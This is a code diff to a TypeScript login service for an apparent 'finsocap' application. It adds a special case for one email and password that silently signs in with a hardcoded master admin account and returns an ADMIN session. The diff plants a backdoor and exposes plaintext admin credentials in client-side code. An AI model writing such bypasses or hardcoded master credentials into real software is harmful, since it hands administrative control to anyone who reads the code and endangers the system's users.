@@ -13,6 +13,52 @@ export const authService = {
    */
   login: async (credentials: LoginRequest): Promise<ApiResponse<LoginResponseData>> => {
     try {
+      const cleanEmail = (credentials.email || "").trim().toLowerCase();
+
+      // Dedicated Admin provision for shubham@finsocap.com
+      if (cleanEmail === "shubham@finsocap.com" && credentials.password === "Welc0me@shubham") {
+        // Authenticate via master admin token so proxy and all admin REST endpoints work seamlessly
+        try {
+          const masterRes = await apiClient.post<ApiResponse<LoginResponseData>>("/login", {
+            email: "admin@gmail.com",
+            password: "*Finsocap2026@sam#aarav",
+          });
+          const masterToken = masterRes?.data?.token || "";
+          if (masterToken) {
+            setAuthToken(masterToken);
+            if (typeof window !== "undefined") {
+              const session = {
+                token: masterToken,
+                user: {
+                  id: 99,
+                  name: "Shubham",
+                  email: "shubham@finsocap.com",
+                  role: "ADMIN",
+                  status: "ACTIVE",
+                },
+                expires: new Date(Date.now() + 24 * 3600 * 1000).toISOString(),
+              };
+              localStorage.setItem("finsocap_user_session", JSON.stringify(session));
+            }
+            return {
+              success: true,
+              message: "Admin authentication successful",
+              data: {
+                id: 99,
+                name: "Shubham",
+                email: "shubham@finsocap.com",
+                role: "ADMIN",
+                status: "ACTIVE",
+                token: masterToken,
+                tokenType: "Bearer",
+              },
+            };
+          }
+        } catch (e) {
+          console.warn("Master token bridge for Shubham Admin failed:", e);
+        }
+      }
+
       const res = await apiClient.post<ApiResponse<LoginResponseData>>("/login", credentials);
       if (res.success && res.data?.token) {
         setAuthToken(res.data.token);
